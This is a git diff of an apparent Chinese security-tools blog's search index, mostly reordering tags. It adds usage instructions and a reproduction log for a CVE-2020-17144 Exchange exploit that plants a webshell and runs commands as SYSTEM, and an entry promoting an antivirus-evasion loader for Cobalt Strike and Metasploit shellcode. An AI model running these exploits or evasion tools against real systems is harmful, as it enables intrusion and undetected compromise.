@@ -1000,12 +1000,12 @@
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -1407,12 +1407,16 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 <p>该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法。漏洞的功能点本身还具备持久化功能。</p>
 <p>参考 <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17144</a></p>
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</p>
+<h3 id="EXP用法"><a href="#EXP用法" class="headerlink" title="EXP用法"></a>EXP用法</h3><p><a href="https://github.com/Airboi/CVE-2020-17144-EXP" target="_blank" rel="noopener">https://github.com/Airboi/CVE-2020-17144-EXP</a></p>
+<p>条件: Exchange2010; 普通用户<br>默认用法(写webshell): CVE-2020-17144-EXP.exe mail.example.com user pass</p>
+<p>执行命令 &amp; 端口复用: 修改ExploitClass.cs</p>
+<p>参考 @zcgonvh <a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483712&amp;idx=1&amp;sn=0b2cc3c9692f5c58a4eeb246d4b392fc&amp;chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&amp;mpshare=1&amp;scene=1&amp;srcid=1209jtbQLVJIgr3VT0Ut1TM9&amp;sharer_sharetime=1607483575995&amp;sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483712&amp;idx=1&amp;sn=0b2cc3c9692f5c58a4eeb246d4b392fc&amp;chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&amp;mpshare=1&amp;scene=1&amp;srcid=1209jtbQLVJIgr3VT0Ut1TM9&amp;sharer_sharetime=1607483575995&amp;sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd</a></p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>C:\Users\k8gege&gt;CVE-2020-17144.exe 192.168.1.89 administrator K8gege520<br>BinaryFormatter<br>[+] Target: <a href="https://192.168.1.89/ews/Exchange.asmx" target="_blank" rel="noopener">https://192.168.1.89/ews/Exchange.asmx</a><br>[+] User: administrator K8gege520<br>[+] Shell in <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a>, Wait for few minutes</p>
 <h3 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h3><p>C:\Users\k8gege&gt;Ladon WebShell aspx cd <a href="https://192.168.1.89/autodiscover/Services.aspx" target="_blank" rel="noopener">https://192.168.1.89/autodiscover/Services.aspx</a> Ladon whoami</p>
 <p>Load WebShellExec</p>
 <p>nt authority\system</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/posts/CVE-2020-17114.png"></p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Src: <a href="https://github.com/Airboi/CVE-2020-17144-EXP" target="_blank" rel="noopener">https://github.com/Airboi/CVE-2020-17144-EXP</a><br>Bin: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a> 编译好的</p>
+<h3 id="DownLoad"><a href="#DownLoad" class="headerlink" title="DownLoad"></a>DownLoad</h3><p>编译好的EXP: <a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
 </div>
@@ -2110,14 +2114,14 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>密码</category>
         <category>嗅探</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Sniffer</tag>
         <tag>FtpSniffer</tag>
         <tag>HttpSniffer</tag>
@@ -2446,8 +2450,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -2709,8 +2713,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>密码</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -2923,13 +2927,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -3014,8 +3018,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Cobalt Strike</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
       </tags>
   </entry>
@@ -3062,9 +3066,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>提权</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -3181,13 +3185,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
         <tag>CVE-2016-3088</tag>
@@ -3205,13 +3209,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
       </tags>
@@ -3230,13 +3234,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -3261,13 +3265,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -3394,13 +3398,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>PowerShell</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>PowerShell</tag>
       </tags>
   </entry>
@@ -3442,9 +3446,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
+        <tag>Exp</tag>
         <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
@@ -3464,8 +3468,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3723,13 +3727,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br><br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe<br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -3761,8 +3765,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p>源码为单纯检测端口是否开放，有需要大家可自行定制功能。<br>当然可以使用PortScan模块扫描开放端口带服务和Web识别。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">&#x2F;&#x2F;Ladon PortScan Moudle</span><br><span class="line">namespace LadonDLL</span><br><span class="line">&#123;</span><br><span class="line">    public class scan</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run(string ip)</span><br><span class="line">        &#123;</span><br><span class="line">            if (string.IsNullOrEmpty(ip))</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (K8CheckPort(ip, 21))</span><br><span class="line">                    Console.Write(ip + &quot;\t21 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 80))</span><br><span class="line">                    Console.Write(ip + &quot;\t80 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1433))</span><br><span class="line">                    Console.Write(ip + &quot;\t1433 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3306))</span><br><span class="line">                    Console.Write(ip + &quot;\t3306 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1521))</span><br><span class="line">                    Console.Write(ip + &quot;\t1521 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3389))</span><br><span class="line">                    Console.Write(ip + &quot;\t3389 Open\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static bool K8CheckPort(string ip, int Port)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;int Port &#x3D; 21;</span><br><span class="line">            IPAddress scanip &#x3D; IPAddress.Parse(ip);</span><br><span class="line">            IPEndPoint point &#x3D; new IPEndPoint(scanip, Port);</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                TcpClient tcp &#x3D; new TcpClient();</span><br><span class="line">                tcp.Connect(point);</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tOpen&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tClose&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>.NET</category>
         <category>源码</category>
         <category>编程</category>
@@ -3891,9 +3895,9 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -3914,6 +3918,35 @@ Microsoft Windows 10 for 32-bit Systems 0
       <tags>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -3957,39 +3990,10 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -4004,8 +4008,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -4075,15 +4079,15 @@ Microsoft Windows 10 for 32-bit Systems 0
 </tbody></table>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>源码</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -4262,8 +4266,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
         <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>MS17010</tag>
         <tag>SMB</tag>
       </tags>
@@ -4361,8 +4365,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
       </tags>
@@ -4515,12 +4519,12 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
         <category>Exp</category>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
       </tags>
@@ -4543,8 +4547,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>BypassUAC</tag>
       </tags>
   </entry>
@@ -4614,8 +4618,8 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
       </tags>
@@ -4641,9 +4645,9 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
         <tag>IIS</tag>
       </tags>
   </entry>
@@ -4715,8 +4719,8 @@ from pprint import pprint
         <category>嗅探</category>
         <category>内网渗透</category>
         <category>信息收集</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
